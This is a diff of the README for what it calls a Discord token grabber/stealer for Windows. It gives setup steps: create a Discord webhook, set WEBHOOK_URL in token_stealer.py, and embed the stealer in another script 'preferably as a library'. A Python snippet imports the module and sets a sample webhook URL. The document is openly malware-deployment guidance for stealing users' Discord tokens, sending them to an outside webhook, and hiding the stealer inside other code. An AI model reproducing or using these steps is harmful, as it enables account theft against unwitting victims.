@@ -13,15 +13,15 @@ This version of the grabber only supports **Windows**.
 # Example Message
 ![example](https://imgur.com/HfGR31U.png "example")
 
-<br>
 
 # How to use
  1. Create a webhook on your Discord server.
- 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token_grabber.py](token_grabber.py)
+ 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token_stealer.py](token_stealer.py)
 <br>
  2.5. add it to another script (preferably as a library)
- example:
- ```python
+
+example:
+```python
 import token_stealer
 token_stealer.WEBHOOK_URL = "https://discord.com/api/webhooks/123456789/fyugYDStygft2g7y8f6datyFTYydfg61hfTY78y"
 token_stealer.PING_ME = True
